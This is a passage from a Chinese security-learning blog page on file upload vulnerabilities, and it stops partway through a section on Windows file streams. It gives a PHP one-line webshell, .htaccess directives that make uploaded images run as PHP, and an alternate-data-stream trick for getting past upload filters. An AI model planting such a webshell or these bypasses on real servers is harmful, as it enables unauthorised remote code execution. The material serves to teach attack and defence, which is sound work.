<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>文件上传漏洞 | Lingのblog</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="Lingのblog">
    
    <link rel="preload" href="/blog2/assets/css/0.styles.7bb9d479.css" as="style"><link rel="preload" href="/blog2/assets/js/app.8931c98e.js" as="script"><link rel="preload" href="/blog2/assets/js/2.733019b2.js" as="script"><link rel="preload" href="/blog2/assets/js/33.d4bdaa6f.js" as="script"><link rel="prefetch" href="/blog2/assets/js/10.e672280b.js"><link rel="prefetch" href="/blog2/assets/js/11.53245d8e.js"><link rel="prefetch" href="/blog2/assets/js/12.4b6bc521.js"><link rel="prefetch" href="/blog2/assets/js/13.7d8e1033.js"><link rel="prefetch" href="/blog2/assets/js/14.3912c2ba.js"><link rel="prefetch" href="/blog2/assets/js/15.2ddd6420.js"><link rel="prefetch" href="/blog2/assets/js/16.0aca61d2.js"><link rel="prefetch" href="/blog2/assets/js/17.8935c8a6.js"><link rel="prefetch" href="/blog2/assets/js/18.646d87f1.js"><link rel="prefetch" href="/blog2/assets/js/19.5a79c48f.js"><link rel="prefetch" href="/blog2/assets/js/20.8f694d91.js"><link rel="prefetch" href="/blog2/assets/js/21.2f4c0f41.js"><link rel="prefetch" href="/blog2/assets/js/22.903e81b7.js"><link rel="prefetch" href="/blog2/assets/js/23.da420023.js"><link rel="prefetch" href="/blog2/assets/js/24.35860ae7.js"><link rel="prefetch" href="/blog2/assets/js/25.b96aec5e.js"><link rel="prefetch" href="/blog2/assets/js/26.89e33a13.js"><link rel="prefetch" href="/blog2/assets/js/27.5105a30f.js"><link rel="prefetch" href="/blog2/assets/js/28.8f1be9cf.js"><link rel="prefetch" href="/blog2/assets/js/29.cf28a975.js"><link rel="prefetch" href="/blog2/assets/js/3.670ed6d9.js"><link rel="prefetch" href="/blog2/assets/js/30.df8f8f51.js"><link rel="prefetch" href="/blog2/assets/js/31.55e51cab.js"><link rel="prefetch" href="/blog2/assets/js/32.168463c4.js"><link rel="prefetch" href="/blog2/assets/js/34.369f2cce.js"><link rel="prefetch" href="/blog2/assets/js/35.136b3d92.js"><link rel="prefetch" href="/blog2/assets/js/36.d18daca2.js"><link rel="prefetch" href="/blog2/assets/js/4.d12742be.js"><link rel="prefetch" href="/blog2/assets/js/5.216cae74.js"><link rel="prefetch" href="/blog2/assets/js/6.2d0a63f8.js"><link rel="prefetch" href="/blog2/assets/js/7.9c9172a7.js"><link rel="prefetch" href="/blog2/assets/js/8.db2431b1.js"><link rel="prefetch" href="/blog2/assets/js/9.36b766d8.js">
    <link rel="stylesheet" href="/blog2/assets/css/0.styles.7bb9d479.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/blog2/" class="home-link router-link-active"><!----> <span class="site-name">Lingのblog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog2/" class="nav-link">
  首页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="常用在线工具" class="dropdown-title"><span class="title">常用在线工具</span> <span class="arrow down"></span></button> <button type="button" aria-label="常用在线工具" class="mobile-dropdown-title"><span class="title">常用在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://www.asciim.cn/m/tools/convert_ascii_to_string.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  各进制ASCII码转字符串
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://oktools.net/image2base64" target="_blank" rel="noopener noreferrer" class="nav-link external">
  图片转base64编码
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://xssaq.com/login/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  XSS在线平台
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  进制转换
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://base64.us/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Base64在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener noreferrer" class="nav-link external">
  佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="http://hi.pcmoe.net/Buddha.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  新佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/pyc/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反编译pyc
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="LingのGithub" class="dropdown-title"><span class="title">LingのGithub</span> <span class="arrow down"></span></button> <button type="button" aria-label="LingのGithub" class="mobile-dropdown-title"><span class="title">LingのGithub</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Joker123op/blog2.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog2/" class="nav-link">
  首页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="常用在线工具" class="dropdown-title"><span class="title">常用在线工具</span> <span class="arrow down"></span></button> <button type="button" aria-label="常用在线工具" class="mobile-dropdown-title"><span class="title">常用在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://www.asciim.cn/m/tools/convert_ascii_to_string.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  各进制ASCII码转字符串
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://oktools.net/image2base64" target="_blank" rel="noopener noreferrer" class="nav-link external">
  图片转base64编码
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://xssaq.com/login/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  XSS在线平台
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  进制转换
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://base64.us/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Base64在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener noreferrer" class="nav-link external">
  佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="http://hi.pcmoe.net/Buddha.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  新佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/pyc/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反编译pyc
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="LingのGithub" class="dropdown-title"><span class="title">LingのGithub</span> <span class="arrow down"></span></button> <button type="button" aria-label="LingのGithub" class="mobile-dropdown-title"><span class="title">LingのGithub</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Joker123op/blog2.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><a href="/blog2/" class="sidebar-heading clickable router-link-active"><span>欢迎学习</span> <!----></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog2/" aria-current="page" class="sidebar-link">博客介绍</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Python笔记" class="sidebar-heading clickable"><span>Python3基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/图片隐写" class="sidebar-heading clickable"><span>CTF:wp</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Reverse" class="sidebar-heading clickable"><span>逆向</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Database" class="sidebar-heading clickable open"><span>渗透</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog2/handbook/Database.html" class="sidebar-link">数据库</a></li><li><a href="/blog2/handbook/php.html" class="sidebar-link">PHP</a></li><li><a href="/blog2/handbook/sql.html" class="sidebar-link">SQL注入</a></li><li><a href="/blog2/handbook/xss.html" class="sidebar-link">XSS注入</a></li><li><a href="/blog2/handbook/csrf.html" class="sidebar-link">CSRF</a></li><li><a href="/blog2/handbook/文件上传.html" class="active sidebar-link">文件上传</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#文件上传漏洞" class="sidebar-link">文件上传漏洞</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#htaccess文件绕过" class="sidebar-link">.htaccess文件绕过</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#windows文件流绕过" class="sidebar-link">Windows文件流绕过</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#二次渲染" class="sidebar-link">二次渲染</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#条件竞争" class="sidebar-link">条件竞争</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#php-cgi解析漏洞" class="sidebar-link">PHP CGI解析漏洞</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#文件包含漏洞" class="sidebar-link">文件包含漏洞</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#数据溢出绕过" class="sidebar-link">数据溢出绕过</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/文件上传.html#burpsuite" class="sidebar-link">Burpsuite</a></li></ul></li><li><a href="/blog2/handbook/验证码绕过.html" class="sidebar-link">验证码绕过</a></li><li><a href="/blog2/handbook/水平、垂直越权.html" class="sidebar-link">水平、垂直越权</a></li><li><a href="/blog2/handbook/SSRF.html" class="sidebar-link">SSRF-服务端请求伪造</a></li><li><a href="/blog2/handbook/XXE.html" class="sidebar-link">XXE-实体注入攻击</a></li><li><a href="/blog2/handbook/代码执行漏洞.html" class="sidebar-link">代码执行漏洞</a></li><li><a href="/blog2/handbook/信息收集.html" class="sidebar-link">信息收集</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/NA" class="sidebar-heading clickable"><span>信息通讯基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Linux" class="sidebar-heading clickable"><span>操作系统</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/数学md使用方法" class="sidebar-heading clickable"><span>没用的东西</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="header-anchor">#</a> 文件上传漏洞</h2> <p>只要能在目标服务器上放一个一句话木马，是不是就代表我们获取了一定权限</p> <p>一句话木马</p> <div class="language-PHP extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p>如果没有防护规则的文件上传：</p> <p>只要上传一个php就可以拿下目标</p> <p>检测恶意代码：</p> <p>前端检测：Js = 没有检测因为js可以被自己禁用，而且可以使用burp suite进行篡改js
前端代码只能在浏览器里执行</p> <hr> <p>后端检测：后端PHP。利用黑白名单机制</p> <p>黑名单：不允许黑名单上的东西上传</p> <p>白名单：只允许黑名单上的东西上传(这种相对于白名单机制的防范效果更好)</p> <p>判断网站上传黑白名单的机制的办法就是随便上传一个后缀名例如<code>.a</code> <code>.b</code>上传一些根本就不存在的后缀看看是否能上传成功。如果上传成功证明网页是用的是黑名单机制</p> <p>在网站中php、js、asp都有属于自己的别名，这样上传之后一样会当作代码执行</p> <hr> <h2 id="htaccess文件绕过"><a href="#htaccess文件绕过" class="header-anchor">#</a> .htaccess文件绕过</h2> <blockquote><p><code>.htaccess文件绕过。全程是Hypertext Access(超文本入口).htaccess文件也被分成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录</code></p></blockquote> <p>.htaccess功能：
文件夹密码保护、用户自定义重定向、自定义404页面、扩展名为静态化、静止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表</p> <p>很可惜，这么一个强大的功能默认是不开启Apache（有伪静态的会开启）</p> <p>例如：</p> <p><code>AddType addlication/x-httpd-php.jpg</code></p> <p>这个指令代表着.jpg文件会当作php来解析</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">&quot;abc&quot;</span> <span class="token operator">&gt;</span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span>
</code></pre></div><p>abc是你需要以php执行的文件名字</p> <p>如果无法将文件命名为.htaccess怎么办</p> <h3 id="使用cmd进行重命名"><a href="#使用cmd进行重命名" class="header-anchor">#</a> 使用cmd进行重命名</h3> <div class="language-CMD extra-class"><pre class="language-text"><code>ren 17.txt .htaccess
</code></pre></div><hr> <p>在Windows里<code>php == php+空格</code></p> <p>但是在后端是无法检测的，在后端中 <code>php != php+空格</code></p> <p>文件上传的流程</p> <p>文件上传 -&gt; 检测 -&gt; 上传到缓存文件(tmp) -&gt; 后端代码的移动，移动到指定的目录重命名</p> <h2 id="windows文件流绕过"><a href="#windows文件流绕过" class="header-anchor">#</a> Windows文件流绕过</h2> <p>Windows里有一个骚操作就是隐藏文件</p> <div class="language-cmd extra-class"><pre class="language-text"><code>echo 123123 &gt; caidao.exe:123.txt

caidao.exe:123.txt
